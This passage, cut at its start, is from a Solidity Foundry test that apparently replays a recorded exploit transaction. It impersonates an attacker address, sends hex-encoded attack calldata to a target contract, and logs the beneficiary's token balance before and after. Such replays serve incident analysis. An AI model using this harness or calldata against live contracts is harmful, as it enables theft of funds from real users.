4b400912de6afedede17ea0feb39c3e2c3b900b4a95f239f010c251afb46a89984d868151c5b209bf97f0d554ad3b05a210efb4de2a4930747e423e87b1fb139b63fcc94f17e286ae44b282d93e68621a7e6efa1e9b9893cc74b52a65196a60693a9e325c0fc40100046b006870c83b1cd49e766ac9209f8d68763df721004ebd0b940000000000000000000000000000000000000000000000000000000000000001";

    function testReplay() public {
        beneficiary = ATTACKER_ADDR;
        if (fundingToken == address(0)) vm.deal(address(this), 0);
        _logTokenBalance(fundingToken, beneficiary, "[REPLAY] Before");
        
        uint256 gasBefore = gasleft();
        try this._executeReplay() {
            uint256 gasUsed = gasBefore - gasleft();
            (string memory symbol, uint256 balance, uint8 decimals) = _getTokenData(fundingToken, beneficiary);
            _logTokenBalance(fundingToken, beneficiary, "[REPLAY] After");
            _writeExecutionResult("REPLAY", gasUsed, balance, symbol, decimals);
        } catch Error(string memory reason) {
            uint256 gasUsed = gasBefore - gasleft();
            _writePartialResult("REPLAY_FAILED", reason, gasUsed);
            emit log_string(string(abi.encodePacked("[REPLAY] Reverted: ", reason)));
            revert(reason);
        } catch (bytes memory) {
            uint256 gasUsed = gasBefore - gasleft();
            _writePartialResult("REPLAY_FAILED", "Low-level revert", gasUsed);
            emit log_string("[REPLAY] Low-level revert");
            revert("Low-level revert");
        }
    }

    function _executeReplay() external {
        vm.startPrank(ATTACKER_ADDR);
        (bool success, bytes memory returnData) = TARGET_ADDR.call(INPUT_DATA);
        if (!success) {
            if (returnData.length > 0) {
                assembly {
                    revert(add(returnData, 32), mload(returnData))
                }
            }
            revert("Replay failed");
        }
        vm.stopPrank();
    }
}
